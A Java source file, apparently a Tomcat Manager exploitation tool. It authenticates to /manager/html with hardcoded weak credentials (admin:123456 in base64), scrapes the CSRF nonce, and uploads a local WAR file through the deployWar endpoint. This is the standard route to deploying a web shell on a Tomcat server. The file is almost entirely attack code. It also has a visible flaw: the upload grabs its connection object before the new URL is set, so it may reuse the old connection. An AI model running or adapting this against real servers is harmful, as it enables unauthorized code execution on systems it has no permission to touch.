package org.dudu.TomcatVuln.request;

import org.dudu.TomcatVuln.DTO.PasswordRequestDTO;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public  class request extends HttpRequest<PasswordRequestDTO,String> {
    public static String url = "http://127.0.0.1:8080/manager/html";
    public String csrfNonceValue;

    public String cookie;

    @Override
    protected String request(PasswordRequestDTO requestParam) {
        try {
            this.setConnection(url);
            HttpURLConnection httpURLConnection;
            httpURLConnection = connection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Authorization", "Basic YWRtaW46MTIzNDU2");
            httpURLConnection.connect();
            String cookieHeader = httpURLConnection.getHeaderField("Set-Cookie");
            String[] cookies = cookieHeader.split(";");
            cookie = cookies[0];
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            String regex = "org\\.apache\\.catalina\\.filters\\.CSRF_NONCE=([a-zA-Z0-9]+)";
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(response.toString());
            if (matcher.find()) {
                csrfNonceValue = matcher.group(1);
            } else {
                System.out.println("未找到 CSRF_NONCE 值");
            }
            return httpURLConnection.getResponseMessage();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void uploadFile() throws IOException {
        String u = url + "/upload?org.apache.catalina.filters.CSRF_NONCE=" + csrfNonceValue;
        String boundary = "WebKitFormBoundaryvfBZf2AGwnF8zkIY";
        String charset = "UTF-8";
        String fileFieldName = "deployWar";
        String filename = "1.war";
        File uploadFile = new File("C:\\Users\\ao\\Desktop\\" + filename);
        HttpURLConnection httpURLConnection;
        httpURLConnection = connection;
        this.setConnection(u);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Authorization", "Basic YWRtaW46MTIzNDU2");
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestProperty("Cookie",cookie);
        httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (OutputStream output = httpURLConnection.getOutputStream();
             PrintWriter writer = new PrintWriter(new OutputStreamWriter(output, charset), true)) {
            // Send binary file.
            writer.append("--" + boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"" + fileFieldName + "\"; filename=\"" + filename + "\"").append("\r\n");
            writer.append("Content-Type: application/octet-stream").append("\r\n");
            writer.append("\r\n").flush();
            try (FileInputStream fileInputStream = new FileInputStream(uploadFile)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                output.flush(); // Important before continuing with writer!
            }
            writer.append("\r\n").flush(); // CRLF is important! It indicates end of boundary.
            // End of multipart/form-data.
            writer.append("--" + boundary + "--").append("\r\n").flush();
            // Check server's response.
            System.out.println("Response: " + httpURLConnection.getResponseCode() + " " + httpURLConnection.getResponseMessage());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) throws IOException {
        request request = new request();
        request.request(new PasswordRequestDTO(url,"111"));
        request.uploadFile();
    }
}
